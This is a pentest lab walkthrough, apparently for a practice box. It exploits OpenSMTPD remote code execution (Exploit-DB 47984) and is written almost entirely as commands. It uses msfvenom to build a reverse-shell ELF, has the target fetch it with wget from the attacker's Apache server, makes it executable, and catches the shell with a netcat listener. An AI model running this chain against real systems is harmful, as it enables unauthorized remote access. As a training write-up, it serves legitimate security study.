searchsploit

searchsploit

`searchsploit opensmtpd`
![fee8a95e78f28d99f544b9c05345dc68.png](../../../../../_resources/011358aeebba4c6abff5a1f5b2c84031.png)

# 47984
## Download the remote code execution exploit
`searchsploit -m 47984`

Run to find out usage
```plaintext
python3 47984.py
kali@kali:~/gitWorkspace/pgp/Bratarina$ python3 47984.py 
Usage 47984.py <target ip> <target port> <command>
E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'
```
![678cc427f966259b58bbbd02a923066b.png](../../../../../_resources/d15957561d5847a39d7872217260e695.png)

## See if it will connect to our Kali machine to download a simple file hello.txt

-this exploit did not work on default port 8000 for python3 -m http.server
-staged payload did not work

Start apache server on Kali
`sudo systemctl start apache2`

Run the exploit which attempts to access hello.txt on Kali
`python3 47984.py 192.168.200.71 25 'wget 192.168.49.200/hello.txt'`

Verify that the request was made on Apache log
`sudo tail /var/log/apache2/access.log`

Create payload. We see the following listed as a Linux payload on https://book.hacktricks.xyz/shells/shells/untitled
`msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.49.200 lport=445 -f elf > linux_x64_shellReverseTcp_192.168.49.200_445.elf`

Move the payload to Apache /var/www/html
`sudo mv linux_x64_shellReverseTcp_192.168.49.200_445.elf /var/www/html`

Restart Apache
`sudo systemctl start apache2`

Attempt to download the payload
`python3 47984.py 192.168.200.71 25 'wget 192.168.49.200/linux_x64_shellReverseTcp_192.168.49.200_445.elf'`

Verify it was downloaded
`sudo cat /var/log/apache2/access.log`
![315e89db879bfd6f6ca75fbf687a4a3f.png](../../../../../_resources/925dfa51b0da4d72b827b7a776959ba5.png)

Make the payload executable
`python3 47984.py 192.168.200.71 25 'chmod +x linux_x64_shellReverseTcp_192.168.49.200_445.elf'`

Start a netcat listener on Kali port 445
`sudo nc -lnvp 445`

We have caught a shell
![6ca274a91a913a6f47a6a16e623d8fdd.png](../../../../../_resources/191b6a7726a646c6a502fa9dce8b5dc4.png)






